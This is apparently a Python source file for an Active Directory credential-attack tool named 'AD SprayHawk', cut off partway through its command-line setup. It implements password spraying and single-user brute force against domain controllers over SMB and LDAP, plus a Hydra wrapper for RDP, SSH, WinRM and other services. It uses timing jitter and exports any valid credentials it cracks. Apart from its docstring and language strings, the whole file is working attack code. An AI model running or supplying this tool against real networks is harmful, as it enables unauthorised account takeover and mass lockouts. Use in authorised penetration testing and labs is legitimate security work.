#!/usr/bin/env python3
"""
AD SprayHawk - Multi-Mode Attack Engine
Rejimler: --ps (Password Spray) --bf (Brute Force) --hbf (Hydra Brute Force)
Diller: --lang en|az|tr  (default: en)
YALNIZ icazeli pentest/CTF/lab muhitlerinde istifade ucun.
"""

import argparse
import csv
import json
import re
import shutil
import subprocess
import sys
import time
import random
import socket
from datetime import datetime

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import (
    Progress, BarColumn, TextColumn, TimeElapsedColumn,
    TimeRemainingColumn, SpinnerColumn, MofNCompleteColumn,
)
from rich.live import Live
from rich.text import Text
from rich.align import Align
from rich.rule import Rule
from rich import box

try:
    from impacket.smbconnection import SMBConnection
    from impacket.smbconnection import SessionError as SMBSessionError
except ImportError:
    SMBConnection = None
    SMBSessionError = Exception

try:
    from ldap3 import Server, Connection, ALL, NTLM
    from ldap3.core.exceptions import LDAPBindError, LDAPSocketOpenError
except ImportError:
    Server = None

console = Console()

# ---------------------------------------------------------------------------
# COX-DILLI STRING SISTEMI (--lang en|az|tr)
# ---------------------------------------------------------------------------
STRINGS = {
    "banner_subtitle": {
        "en": "Multi-Mode Active Directory Attack Engine  |  v3.1",
        "az": "Cox Rejimli Active Directory Hucum Aleti  |  v3.1",
        "tr": "Cok Modlu Active Directory Saldiri Araci  |  v3.1",
    },
    "banner_modes": {
        "en": "Modes:  --ps (Spray)  --bf (Brute)  --hbf (Hydra)",
        "az": "Rejimler:  --ps (Spray)  --bf (Brute)  --hbf (Hydra)",
        "tr": "Modlar:  --ps (Spray)  --bf (Brute)  --hbf (Hydra)",
    },
    "mode_ps_name": {"en": "PASSWORD SPRAY", "az": "PASSWORD SPRAY", "tr": "PASSWORD SPRAY"},
    "mode_bf_name": {"en": "BRUTE FORCE", "az": "BRUTE FORCE", "tr": "BRUTE FORCE"},
    "mode_hbf_name": {"en": "HYDRA BRUTE FORCE", "az": "HYDRA BRUTE FORCE", "tr": "HYDRA BRUTE FORCE"},
    "risk_low": {"en": "LOW", "az": "ASAGI", "tr": "DUSUK"},
    "risk_high": {"en": "HIGH", "az": "YUKSEK", "tr": "YUKSEK"},
    "risk_high_hydra": {
        "en": "HIGH (depends on hydra speed)",
        "az": "YUKSEK (hydra suretine bagli)",
        "tr": "YUKSEK (hydra hizina bagli)",
    },
    "mode_label": {"en": "MODE", "az": "REJIM", "tr": "MOD"},
    "risk_label": {"en": "Risk level", "az": "Risk seviyyesi", "tr": "Risk seviyesi"},
    "target_dc_label": {"en": "Target DC", "az": "Hedef DC", "tr": "Hedef DC"},
    "domain_label": {"en": "Domain", "az": "Domain", "tr": "Domain"},
    "target_user_label": {"en": "Target user", "az": "Hedef istifadeci", "tr": "Hedef kullanici"},
    "target_label": {"en": "Target", "az": "Hedef", "tr": "Hedef"},
    "users_label": {"en": "Users", "az": "Istifadeciler", "tr": "Kullanicilar"},
    "passwords_label": {"en": "Passwords", "az": "Parollar", "tr": "Sifreler"},
    "protocols_label": {"en": "Protocols", "az": "Protokollar", "tr": "Protokoller"},
    "total_attempts_label": {"en": "Total attempts", "az": "Umumi cehd", "tr": "Toplam deneme"},
    "service_label": {"en": "Service", "az": "Servis", "tr": "Servis"},
    "lockout_threshold_label": {
        "en": "Lockout threshold", "az": "Lockout threshold", "tr": "Lockout esigi",
    },
    "unknown_careful": {
        "en": "Unknown (BE CAREFUL)", "az": "Namelum (DIQQETLI OL)", "tr": "Bilinmiyor (DIKKATLI OL)",
    },
    "params_panel_title": {
        "en": "Query Parameters", "az": "Sorgu Parametrleri", "tr": "Sorgu Parametreleri",
    },
    "bf_panel_title": {
        "en": "BRUTE FORCE - High Lockout Risk",
        "az": "BRUTE FORCE - Yuksek Lockout Riski",
        "tr": "BRUTE FORCE - Yuksek Lockout Riski",
    },
    "hydra_panel_title": {
        "en": "Hydra Brute Force", "az": "Hydra Brute Force", "tr": "Hydra Brute Force",
    },
    "warn_multi_pass": {
        "en": "WARNING: More than one password! Do not proceed without checking lockout policy.",
        "az": "DIQQET: Birden cox parol! Lockout policy-ni yoxlamadan davam etme.",
        "tr": "DIKKAT: Birden fazla sifre! Lockout policy'yi kontrol etmeden devam etme.",
    },
    "warn_no_threshold": {
        "en": "WARNING: --lockout-threshold not given. This may lock the real account in AD.",
        "az": "DIQQET: --lockout-threshold verilmeyib. Real AD-de bu, hesabi kilidleye biler.",
        "tr": "DIKKAT: --lockout-threshold verilmedi. Gercek AD'de bu, hesabi kilitleyebilir.",
    },
    "progress_spray": {
        "en": "Spraying...", "az": "Spray davam edir...", "tr": "Spray devam ediyor...",
    },
    "progress_bf": {"en": "Brute-force", "az": "Brute-force", "tr": "Brute-force"},
    "progress_panel": {"en": "Progress", "az": "Ireliyeyis", "tr": "Ilerleme"},
    "stats_panel_title": {
        "en": "Live Statistics", "az": "Canli Statistika", "tr": "Canli Istatistik",
    },
    "findings_panel_title": {
        "en": "Findings", "az": "Tapintilar", "tr": "Bulgular",
    },
    "no_findings_yet": {
        "en": "Nothing found yet...", "az": "Hele ki hec ne tapilmadi...", "tr": "Henuz bir sey bulunamadi...",
    },
    "attempts_label": {"en": "Attempts", "az": "Cehdler", "tr": "Denemeler"},
    "valid_label": {"en": "Valid", "az": "Kecerli", "tr": "Gecerli"},
    "locked_label": {"en": "Locked", "az": "Kilidli", "tr": "Kilitli"},
    "disabled_label": {"en": "Disabled", "az": "Deaktiv", "tr": "Devre disi"},
    "error_label": {"en": "Errors", "az": "Xeta", "tr": "Hata"},
    "rate_label": {"en": "Rate", "az": "Suret", "tr": "Hiz"},
    "rate_unit": {"en": "att/sec", "az": "cehd/san", "tr": "deneme/sn"},
    "user_col": {"en": "Username", "az": "Istifadeci", "tr": "Kullanici"},
    "pass_col": {"en": "Password", "az": "Parol", "tr": "Sifre"},
    "proto_col": {"en": "Protocol", "az": "Protokol", "tr": "Protokol"},
    "wait_next_pass": {
        "en": "Waiting {s}s before next password...",
        "az": "Novbeti parola kecmeden evvel {s}s gozlenilir...",
        "tr": "Sonraki sifreye gecmeden once {s}s bekleniyor...",
    },
    "account_locked_stop": {
        "en": "ACCOUNT LOCKED - stopping.", "az": "HESAB KILIDLENDI - dayandirilir.",
        "tr": "HESAP KILITLENDI - durduruluyor.",
    },
    "threshold_reached": {
        "en": "Approaching lockout threshold ({c}/{t}) - stopping automatically.",
        "az": "Lockout threshold-a yaxinlasildi ({c}/{t}) - avtomatik dayandirilir.",
        "tr": "Lockout esigine yaklasildi ({c}/{t}) - otomatik durduruluyor.",
    },
    "summary_rule": {
        "en": "RESULT SUMMARY", "az": "NETICE XULASESI", "tr": "SONUC OZETI",
    },
    "metric_col": {"en": "Metric", "az": "Metrika", "tr": "Metrik"},
    "value_col": {"en": "Value", "az": "Deyer", "tr": "Deger"},
    "total_time": {"en": "Total time", "az": "Umumi vaxt", "tr": "Toplam sure"},
    "seconds": {"en": "seconds", "az": "saniye", "tr": "saniye"},
    "avg_rate": {"en": "Average rate", "az": "Orta suret", "tr": "Ortalama hiz"},
    "valid_creds_metric": {"en": "Valid credentials", "az": "Kecerli melumat", "tr": "Gecerli bilgi"},
    "locked_metric": {"en": "Locked accounts", "az": "Kilidli hesab", "tr": "Kilitli hesap"},
    "disabled_metric": {"en": "Disabled accounts", "az": "Deaktiv hesab", "tr": "Devre disi hesap"},
    "found_creds_title": {
        "en": "Found Valid Credentials", "az": "Tapilan Kecerli Melumatlar", "tr": "Bulunan Gecerli Bilgiler",
    },
    "no_valid_found": {
        "en": "No valid credentials found.", "az": "Hec bir kecerli melumat tapilmadi.",
        "tr": "Gecerli bilgi bulunamadi.",
    },
    "locked_accounts_list": {"en": "Locked accounts:", "az": "Kilidli hesablar:", "tr": "Kilitli hesaplar:"},
    "disabled_accounts_list": {
        "en": "Disabled accounts:", "az": "Deaktiv hesablar:", "tr": "Devre disi hesaplar:",
    },
    "file_not_found": {"en": "File not found:", "az": "Fayl tapilmadi:", "tr": "Dosya bulunamadi:"},
    "results_written": {
        "en": "Results written to file:", "az": "Neticeler fayla yazildi:", "tr": "Sonuclar dosyaya yazildi:",
    },
    "err_bf_needs_user": {
        "en": "[-] --bf mode requires -u/--username.",
        "az": "[-] --bf rejimi ucun -u/--username teleb olunur.",
        "tr": "[-] --bf modu icin -u/--username gereklidir.",
    },
    "err_ps_needs_proto": {
        "en": "--ps requires --smb and/or --ldap", "az": "--ps ucun --smb ve/ya --ldap sec",
        "tr": "--ps icin --smb ve/veya --ldap sec",
    },
    "err_ps_needs_userlist": {
        "en": "--ps requires -U/--userlist", "az": "--ps ucun -U/--userlist teleb olunur",
        "tr": "--ps icin -U/--userlist gereklidir",
    },
    "err_bf_needs_proto": {
        "en": "--bf requires --smb and/or --ldap", "az": "--bf ucun --smb ve/ya --ldap sec",
        "tr": "--bf icin --smb ve/veya --ldap sec",
    },
    "err_bf_needs_passlist": {
        "en": "--bf requires -P/--passwordlist", "az": "--bf ucun -P/--passwordlist teleb olunur",
        "tr": "--bf icin -P/--passwordlist gereklidir",
    },
    "err_hbf_needs_userlist": {
        "en": "--hbf requires -U/--userlist", "az": "--hbf ucun -U/--userlist teleb olunur",
        "tr": "--hbf icin -U/--userlist gereklidir",
    },
    "hydra_not_found": {
        "en": "[-] 'hydra' not found. Install: sudo apt install hydra",
        "az": "[-] 'hydra' tapilmadi. Qurasdir: sudo apt install hydra",
        "tr": "[-] 'hydra' bulunamadi. Kurun: sudo apt install hydra",
    },
    "hydra_exec_fail": {
        "en": "[-] Hydra could not be executed.", "az": "[-] Hydra icra edile bilmedi.",
        "tr": "[-] Hydra calistirilamadi.",
    },
    "hydra_cmd_line": {
        "en": "Executed command:", "az": "Icra olunan emr:", "tr": "Calistirilan komut:",
    },
    "hydra_output_rule": {
        "en": "Hydra Live Output", "az": "Hydra Canli Cixisi", "tr": "Hydra Canli Ciktisi",
    },
    "hydra_found": {"en": "FOUND:", "az": "TAPILDI:", "tr": "BULUNDU:"},
    "stopped_by_user": {
        "en": "Stopped by user (Ctrl+C).", "az": "Istifadeci terefinden dayandirildi.",
        "tr": "Kullanici tarafindan durduruldu.",
    },
    "stop_on_success_msg": {
        "en": "--stop-on-success is enabled, stopping.",
        "az": "--stop-on-success aktivdir, dayanilir.",
        "tr": "--stop-on-success aktif, durduruluyor.",
    },
}


def t(key, lang="en", **kwargs):
    """Verilen acar sozu secilmis dile tercume edir."""
    text = STRINGS.get(key, {}).get(lang, STRINGS.get(key, {}).get("en", key))
    return text.format(**kwargs) if kwargs else text


def get_banner(lang):
    return (
        "[bold cyan]   _____ ____  ____  ___ __  ___ __ __ ___    _       __\n"
        "  / ___// __ \\/ __ \\/   /  |/  // // // //   |  |     / /\n"
        "  \\__ \\/ /_/ / /_/ / /| /|_/ // //_// // //| |  | /| / / \n"
        " ___/ / ____/ _, _/ ___ /  / // __  // // ___ |  |/ |/ /  \n"
        "/____/_/   /_/ |_/_/  |_|  /_/_/ /_/_/_//_/  |_|  |__/[/bold cyan]\n"
        f"[dim]     {t('banner_subtitle', lang)}[/dim]\n"
        f"[dim]        {t('banner_modes', lang)}[/dim]\n"
    )


def get_mode_info(lang):
    return {
        "ps": {"name": t("mode_ps_name", lang), "color": "green", "risk": t("risk_low", lang)},
        "bf": {"name": t("mode_bf_name", lang), "color": "red", "risk": t("risk_high", lang)},
        "hbf": {"name": t("mode_hbf_name", lang), "color": "magenta", "risk": t("risk_high_hydra", lang)},
    }


# ---------------------------------------------------------------------------
# Komekci funksiyalar
# ---------------------------------------------------------------------------
def load_lines(path, lang):
    items = []
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    items.append(line)
    except FileNotFoundError:
        console.print(f"[bold red][-] {t('file_not_found', lang)} {path}[/bold red]")
        sys.exit(1)
    return items


def export_results(path, valid_creds, locked_accounts, disabled_accounts, lang):
    if path.endswith(".json"):
        data = {
            "generated_at": datetime.now().isoformat(),
            "valid_credentials": [{"username": u, "password": p, "protocol": pr} for u, p, pr in valid_creds],
            "locked_accounts": locked_accounts,
            "disabled_accounts": disabled_accounts,
        }
        with open(path, "w") as f:
            json.dump(data, f, indent=2)
    else:
        with open(path, "w", newline="") as f:
            writer = csv.writer(f)
            writer.writerow(["username", "password", "protocol", "status"])
            for u, p, pr in valid_creds:
                writer.writerow([u, p, pr, "VALID"])
            for u in locked_accounts:
                writer.writerow([u, "", "", "LOCKED"])
            for u in disabled_accounts:
                writer.writerow([u, "", "", "DISABLED"])
    console.print(f"[bold green][+] {t('results_written', lang)} {path}[/bold green]")


def try_smb_login(dc_ip, domain, username, password, timeout=5):
    if SMBConnection is None:
        return "error", "impacket not installed"
    try:
        conn = SMBConnection(dc_ip, dc_ip, timeout=timeout)
        conn.login(username, password, domain)
        conn.logoff()
        return "success", None
    except SMBSessionError as e:
        err = str(e)
        if "STATUS_LOGON_FAILURE" in err:
            return "fail", "wrong password"
        elif "STATUS_ACCOUNT_LOCKED_OUT" in err:
            return "locked", "account locked"
        elif "STATUS_ACCOUNT_DISABLED" in err:
            return "disabled", "account disabled"
        elif "STATUS_PASSWORD_EXPIRED" in err or "STATUS_PASSWORD_MUST_CHANGE" in err:
            return "success", "password change required (valid!)"
        elif "STATUS_ACCOUNT_RESTRICTION" in err:
            return "fail", "account restriction"
        else:
            return "error", err
    except (socket.timeout, ConnectionRefusedError, OSError) as e:
        return "error", f"connection error: {e}"
    except Exception as e:
        return "error", str(e)


def try_ldap_login(dc_ip, domain, username, password, timeout=5):
    if Server is None:
        return "error", "ldap3 not installed"
    try:
        server = Server(dc_ip, get_info=ALL, connect_timeout=timeout)
        upn = f"{username}@{domain}"
        conn = Connection(server, user=upn, password=password, authentication=NTLM)
        if conn.bind():
            conn.unbind()
            return "success", None
        result = conn.result.get("description", "") if conn.result else ""
        if "invalidCredentials" in str(result):
            return "fail", "wrong password"
        return "fail", str(result)
    except LDAPBindError as e:
        return "fail", str(e)
    except LDAPSocketOpenError as e:
        return "error", f"connection error: {e}"
    except Exception as e:
        return "error", str(e)


PROTOCOL_HANDLERS = {"SMB": try_smb_login, "LDAP": try_ldap_login}


# ---------------------------------------------------------------------------
# UI panelleri
# ---------------------------------------------------------------------------
def make_stats_panel(stats, lang):
    table = Table.grid(padding=(0, 2))
    table.add_column(justify="right", style="bold")
    table.add_column()
    table.add_row(f"[cyan]{t('attempts_label', lang)}:[/cyan]", f"{stats['attempts']}/{stats['total']}")
    table.add_row(f"[green]{t('valid_label', lang)}:[/green]", f"{stats['valid']}")
    table.add_row(f"[yellow]{t('locked_label', lang)}:[/yellow]", f"{stats['locked']}")
    table.add_row(f"[magenta]{t('disabled_label', lang)}:[/magenta]", f"{stats['disabled']}")
    table.add_row(f"[red]{t('error_label', lang)}:[/red]", f"{stats['errors']}")
    table.add_row(f"[blue]{t('rate_label', lang)}:[/blue]", f"{stats['rate']:.1f} {t('rate_unit', lang)}")
    return Panel(table, title=f"[bold]{t('stats_panel_title', lang)}[/bold]", border_style="cyan", box=box.ROUNDED)


def make_findings_panel(valid_creds, lang):
    if not valid_creds:
        return Panel(
            Align.center(Text(t("no_findings_yet", lang), style="dim italic")),
            title=f"[bold]{t('findings_panel_title', lang)}[/bold]", border_style="dim", box=box.ROUNDED,
        )
    table = Table(box=box.SIMPLE_HEAVY, show_header=True, header_style="bold green")
    table.add_column(t("user_col", lang))
    table.add_column(t("pass_col", lang))
    table.add_column(t("proto_col", lang))
    for u, p, pr in valid_creds[-8:]:
        table.add_row(u, p, pr)
    return Panel(table, title=f"[bold]{t('findings_panel_title', lang)}[/bold]", border_style="green", box=box.ROUNDED)


def print_final_summary(valid_creds, locked_accounts, disabled_accounts, stats, start_time, lang):
    elapsed = time.time() - start_time
    console.print()
    console.print(Rule(f"[bold cyan]{t('summary_rule', lang)}[/bold cyan]", style="cyan"))

    summary_table = Table(box=box.ROUNDED, show_header=True, header_style="bold white on blue")
    summary_table.add_column(t("metric_col", lang), style="bold")
    summary_table.add_column(t("value_col", lang), justify="right")
    summary_table.add_row(t("total_time", lang), f"{elapsed:.1f} {t('seconds', lang)}")
    summary_table.add_row(t("total_attempts_label", lang), str(stats["attempts"]))
    summary_table.add_row(t("avg_rate", lang), f"{stats['rate']:.2f} {t('rate_unit', lang)}")
    summary_table.add_row(t("valid_creds_metric", lang), f"[bold green]{len(valid_creds)}[/bold green]")
    summary_table.add_row(t("locked_metric", lang), f"[yellow]{len(locked_accounts)}[/yellow]")
    summary_table.add_row(t("disabled_metric", lang), f"[magenta]{len(disabled_accounts)}[/magenta]")
    console.print(summary_table)

    if valid_creds:
        console.print()
        creds_table = Table(title=t("found_creds_title", lang), box=box.DOUBLE_EDGE,
                             show_header=True, header_style="bold black on green")
        creds_table.add_column(t("user_col", lang))
        creds_table.add_column(t("pass_col", lang))
        creds_table.add_column(t("proto_col", lang))
        for u, p, pr in valid_creds:
            creds_table.add_row(u, p, pr)
        console.print(creds_table)
    else:
        console.print(f"[bold red]{t('no_valid_found', lang)}[/bold red]")

    if locked_accounts:
        console.print(f"\n[yellow]{t('locked_accounts_list', lang)}[/yellow] {', '.join(locked_accounts[:10])}"
                       + (" ..." if len(locked_accounts) > 10 else ""))
    if disabled_accounts:
        console.print(f"[magenta]{t('disabled_accounts_list', lang)}[/magenta] {', '.join(disabled_accounts[:10])}"
                       + (" ..." if len(disabled_accounts) > 10 else ""))


# ---------------------------------------------------------------------------
# REJIM 1: PASSWORD SPRAY (--ps)
# ---------------------------------------------------------------------------
def run_password_spray(args, protocols, lang):
    users = load_lines(args.userlist, lang)
    passwords = [args.password] if args.password else load_lines(args.passwordlist, lang)
    total_attempts = len(users) * len(passwords) * len(protocols)

    console.print(Panel.fit(
        f"[bold]{t('users_label', lang)}:[/bold] {len(users)}   "
        f"[bold]{t('passwords_label', lang)}:[/bold] {len(passwords)}   "
        f"[bold]{t('protocols_label', lang)}:[/bold] {', '.join(protocols)}   "
        f"[bold]{t('total_attempts_label', lang)}:[/bold] {total_attempts}",
        title=f"[bold cyan]{t('params_panel_title', lang)}[/bold cyan]", border_style="blue",
    ))
    if len(passwords) > 1:
        console.print(f"[bold yellow]{t('warn_multi_pass', lang)}[/bold yellow]")

    valid_creds, locked_accounts, disabled_accounts = [], [], []
    stats = {"attempts": 0, "total": total_attempts, "valid": 0, "locked": 0, "disabled": 0, "errors": 0, "rate": 0.0}
    start_time = time.time()

    progress = Progress(
        SpinnerColumn(style="cyan"), TextColumn("[bold blue]{task.description}"),
        BarColumn(bar_width=40, complete_style="green", finished_style="bold green"),
        MofNCompleteColumn(), TextColumn("*"), TimeElapsedColumn(), TextColumn("*"), TimeRemainingColumn(),
    )
    task = progress.add_task(t("progress_spray", lang), total=total_attempts)

    with Live(console=console, refresh_per_second=6) as live:
        def render():
            grid = Table.grid(expand=True)
            grid.add_row(Panel(progress, border_style="blue", box=box.ROUNDED,
                                title=f"[bold]{t('progress_panel', lang)}[/bold]"))
            cols = Table.grid(expand=True)
            cols.add_column(ratio=1); cols.add_column(ratio=2)
            cols.add_row(make_stats_panel(stats, lang), make_findings_panel(valid_creds, lang))
            grid.add_row(cols)
            return grid

        live.update(render())

        for pwd_idx, password in enumerate(passwords, start=1):
            for username in users:
                for protocol in protocols:
                    status, detail = PROTOCOL_HANDLERS[protocol](args.dc, args.domain, username, password)
                    stats["attempts"] += 1
                    elapsed = time.time() - start_time
                    stats["rate"] = stats["attempts"] / elapsed if elapsed > 0 else 0

                    if status == "success":
                        valid_creds.append((username, password, protocol)); stats["valid"] += 1
                    elif status == "locked":
                        if username not in locked_accounts: locked_accounts.append(username)
                        stats["locked"] += 1
                    elif status == "disabled":
                        if username not in disabled_accounts: disabled_accounts.append(username)
                        stats["disabled"] += 1
                    elif status == "error":
                        stats["errors"] += 1

                    progress.update(task, advance=1)
                    live.update(render())

                    if status == "success" and args.stop_on_success:
                        progress.update(task, completed=total_attempts)
                        live.update(render())
                        print_final_summary(valid_creds, locked_accounts, disabled_accounts, stats, start_time, lang)
                        if args.output:
                            export_results(args.output, valid_creds, locked_accounts, disabled_accounts, lang)
                        return

                    time.sleep(args.delay + random.uniform(0, args.jitter))

            if args.reset_wait and pwd_idx < len(passwords):
                console.print(f"[dim]{t('wait_next_pass', lang, s=args.reset_wait)}[/dim]")
                time.sleep(args.reset_wait)

    print_final_summary(valid_creds, locked_accounts, disabled_accounts, stats, start_time, lang)
    if args.output:
        export_results(args.output, valid_creds, locked_accounts, disabled_accounts, lang)


# ---------------------------------------------------------------------------
# REJIM 2: BRUTE FORCE (--bf)
# ---------------------------------------------------------------------------
def run_brute_force(args, protocols, lang):
    if not args.username:
        console.print(f"[bold red]{t('err_bf_needs_user', lang)}[/bold red]")
        sys.exit(1)

    passwords = load_lines(args.passwordlist, lang)
    total_attempts = len(passwords) * len(protocols)

    threshold_display = args.lockout_threshold if args.lockout_threshold else t("unknown_careful", lang)
    console.print(Panel.fit(
        f"[bold]{t('target_user_label', lang)}:[/bold] {args.username}   "
        f"[bold]{t('passwords_label', lang)}:[/bold] {len(passwords)}   "
        f"[bold]{t('lockout_threshold_label', lang)}:[/bold] {threshold_display}",
        title=f"[bold red]{t('bf_panel_title', lang)}[/bold red]", border_style="red",
    ))

    if not args.lockout_threshold:
        console.print(f"[bold yellow]{t('warn_no_threshold', lang)}[/bold yellow]")

    valid_creds, locked_accounts, disabled_accounts = [], [], []
    stats = {"attempts": 0, "total": total_attempts, "valid": 0, "locked": 0, "disabled": 0, "errors": 0, "rate": 0.0}
    start_time = time.time()
    consecutive_fails = 0

    progress = Progress(
        SpinnerColumn(style="red"), TextColumn("[bold red]{task.description}"),
        BarColumn(bar_width=40, complete_style="red", finished_style="bold red"),
        MofNCompleteColumn(), TextColumn("*"), TimeElapsedColumn(), TextColumn("*"), TimeRemainingColumn(),
    )
    task = progress.add_task(f"{t('progress_bf', lang)}: {args.username}", total=total_attempts)

    with Live(console=console, refresh_per_second=6) as live:
        def render():
            grid = Table.grid(expand=True)
            grid.add_row(Panel(progress, border_style="red", box=box.ROUNDED,
                                title=f"[bold]{t('progress_panel', lang)}[/bold]"))
            cols = Table.grid(expand=True)
            cols.add_column(ratio=1); cols.add_column(ratio=2)
            cols.add_row(make_stats_panel(stats, lang), make_findings_panel(valid_creds, lang))
            grid.add_row(cols)
            return grid

        live.update(render())

        for password in passwords:
            for protocol in protocols:
                status, detail = PROTOCOL_HANDLERS[protocol](args.dc, args.domain, args.username, password)
                stats["attempts"] += 1
                elapsed = time.time() - start_time
                stats["rate"] = stats["attempts"] / elapsed if elapsed > 0 else 0

                if status == "success":
                    valid_creds.append((args.username, password, protocol)); stats["valid"] += 1
                    consecutive_fails = 0
                elif status == "locked":
                    locked_accounts.append(args.username); stats["locked"] += 1
                    progress.update(task, completed=total_attempts)
                    live.update(render())
                    console.print(f"[bold red]{t('account_locked_stop', lang)}[/bold red]")
                    print_final_summary(valid_creds, locked_accounts, disabled_accounts, stats, start_time, lang)
                    if args.output:
                        export_results(args.output, valid_creds, locked_accounts, disabled_accounts, lang)
                    return
                elif status == "disabled":
                    disabled_accounts.append(args.username); stats["disabled"] += 1
                elif status == "error":
                    stats["errors"] += 1
                else:
                    consecutive_fails += 1

                progress.update(task, advance=1)
                live.update(render())

                if args.lockout_threshold and consecutive_fails >= (args.lockout_threshold - 1):
                    progress.update(task, completed=total_attempts)
                    live.update(render())
                    console.print(
                        f"[bold yellow]{t('threshold_reached', lang, c=consecutive_fails, t=args.lockout_threshold)}[/bold yellow]"
                    )
                    print_final_summary(valid_creds, locked_accounts, disabled_accounts, stats, start_time, lang)
                    if args.output:
                        export_results(args.output, valid_creds, locked_accounts, disabled_accounts, lang)
                    return

                if status == "success" and args.stop_on_success:
                    progress.update(task, completed=total_attempts)
                    live.update(render())
                    console.print(f"[dim]{t('stop_on_success_msg', lang)}[/dim]")
                    print_final_summary(valid_creds, locked_accounts, disabled_accounts, stats, start_time, lang)
                    if args.output:
                        export_results(args.output, valid_creds, locked_accounts, disabled_accounts, lang)
                    return

                time.sleep(args.delay + random.uniform(0, args.jitter))

    print_final_summary(valid_creds, locked_accounts, disabled_accounts, stats, start_time, lang)
    if args.output:
        export_results(args.output, valid_creds, locked_accounts, disabled_accounts, lang)


# ---------------------------------------------------------------------------
# REJIM 3: HYDRA BRUTE FORCE (--hbf)
# ---------------------------------------------------------------------------
HYDRA_SERVICES = ["smb", "ldap", "ldap2", "rdp", "ssh", "ftp", "mssql", "winrm"]
HYDRA_LINE_RE = re.compile(
    r"\[(?P<port>\d+)\]\[(?P<service>[\w-]+)\]\s+host:\s+(?P<host>\S+)\s+login:\s+(?P<login>\S+)\s+password:\s+(?P<password>\S+)"
)
HYDRA_ATTEMPT_RE = re.compile(r"\[ATTEMPT\].*?-\s*(\d+)\s+of\s+(\d+)")
HYDRA_TOTAL_TRIES_RE = re.compile(r"(\d+)\s+login\s+tries")


def run_hydra_brute_force(args, lang):
    hydra_path = shutil.which("hydra")
    if not hydra_path:
        console.print(f"[bold red]{t('hydra_not_found', lang)}[/bold red]")
        sys.exit(1)

    users = load_lines(args.userlist, lang)
    passwords = [args.password] if args.password else load_lines(args.passwordlist, lang)

    console.print(Panel.fit(
        f"[bold]{t('service_label', lang)}:[/bold] {args.service}   "
        f"[bold]{t('users_label', lang)}:[/bold] {len(users)}   "
        f"[bold]{t('passwords_label', lang)}:[/bold] {len(passwords)}   "
        f"[bold]{t('target_label', lang)}:[/bold] {args.dc}",
        title=f"[bold magenta]{t('hydra_panel_title', lang)}[/bold magenta]", border_style="magenta",
    ))

    cmd = [hydra_path, "-L", args.userlist]
    if args.password:
        cmd += ["-p", args.password]
    else:
        cmd += ["-P", args.passwordlist]

    cmd += ["-t", str(args.threads), "-W", str(int(args.delay)) if args.delay else "1"]
    if args.verbose:
        cmd.append("-V")
    cmd += [args.dc, args.service]

    console.print(f"[dim]{t('hydra_cmd_line', lang)} {' '.join(cmd)}[/dim]\n")

    valid_creds = []
    stats = {"attempts": 0, "total": len(users) * len(passwords), "valid": 0,
             "locked": 0, "disabled": 0, "errors": 0, "rate": 0.0}
    start_time = time.time()

    try:
        process = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, bufsize=1, universal_newlines=True,
        )
    except FileNotFoundError:
        console.print(f"[bold red]{t('hydra_exec_fail', lang)}[/bold red]")
        sys.exit(1)

    console.print(Rule(f"[bold magenta]{t('hydra_output_rule', lang)}[/bold magenta]", style="magenta"))
    for line in process.stdout:
        line = line.rstrip()
        if not line:
            continue
        match = HYDRA_LINE_RE.search(line)
        attempt_match = HYDRA_ATTEMPT_RE.search(line)
        total_match = HYDRA_TOTAL_TRIES_RE.search(line)

        if match:
            login = match.group("login")
            password = match.group("password")
            service = match.group("service")
            valid_creds.append((login, password, service.upper()))
            stats["valid"] += 1
            console.print(f"[bold green]  {t('hydra_found', lang)} {login}:{password} ({service})[/bold green]")
        elif attempt_match:
            stats["attempts"] = int(attempt_match.group(1))
            console.print(f"[dim]{line}[/dim]")
        elif total_match and stats["attempts"] == 0:
            stats["total"] = int(total_match.group(1))
            console.print(f"[dim]{line}[/dim]")
        else:
            console.print(f"[dim]{line}[/dim]")

    if stats["attempts"] == 0 and stats["total"] > 0:
        stats["attempts"] = stats["total"]

    process.wait()
    elapsed = time.time() - start_time
    stats["rate"] = stats["attempts"] / elapsed if elapsed > 0 else 0

    console.print(Rule(style="magenta"))
    print_final_summary(valid_creds, [], [], stats, start_time, lang)
    if args.output:
        export_results(args.output, valid_creds, [], [], lang)


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(
        description="AD SprayHawk - Multi-Mode Attack Engine (EN/AZ/TR)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )

    mode_group = parser.add_mutually_exclusive_group(required=True)
    mode_group.add_argument("--ps", action="store_true", help="Password Spray mode (lockout-safe)")
    mode_group.add_argument("--bf", action="store_true", help="Classic Brute Force mode (1 user)")
    mode_group.add_argument("--hbf", action="store_true", help="Hydra Brute Force mode (hydra wrapper)")

    parser.add_argument("--lang", choices=["en", "az", "tr"], default="en",
                         help="Interface language: en (English), az (Azerbaijani), tr (Turkish). Default: en")

    parser.add_argument("-d", "--domain", required=True, help="Domain name")
    parser.add_argument("--dc", required=True, help="Domain Controller IP")

    parser.add_argument("-U", "--userlist", help="Username list file")
    parser.add_argument("-u", "--username", help="Single target user (for --bf)")

    parser.add_argument("-P", "--passwordlist", help="Password list file")
    parser.add_argument("-p", "--password", help="Single password")

    parser.add_argument("--smb", action="store_true", help="Test over SMB")
    parser.add_argument("--ldap", action="store_true", help="Test over LDAP")
    parser.add_argument("--service", choices=HYDRA_SERVICES, default="smb", help="Hydra service name")
    parser.add_argument("--threads", type=int, default=4, help="Hydra thread count")

    parser.add_argument("--delay", type=float, default=1.0, help="Minimum delay between attempts (sec)")
    parser.add_argument("--jitter", type=float, default=0.5, help="Extra random delay (sec)")
    parser.add_argument("--reset-wait", type=int, default=0, help="Wait between password rounds")
    parser.add_argument("--lockout-threshold", type=int, help="AD lockout threshold")
    parser.add_argument("--stop-on-success", action="store_true", help="Stop after first success")
    parser.add_argument("-o", "--output", help="Export results (.csv/.json)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Show all attempts")

    args = parser.parse_args()
    lang = args.lang

    protocols = []
    if args.smb: protocols.append("SMB")
    if args.ldap: protocols.append("LDAP")

    console.print(get_banner(lang))
    console.print(Rule(style="cyan"))

    if args.ps:
        mode = "ps"
        if not protocols:
            console.print(f"[bold red]{t('err_ps_needs_proto', lang)}[/bold red]"); sys.exit(1)
        if not args.userlist:
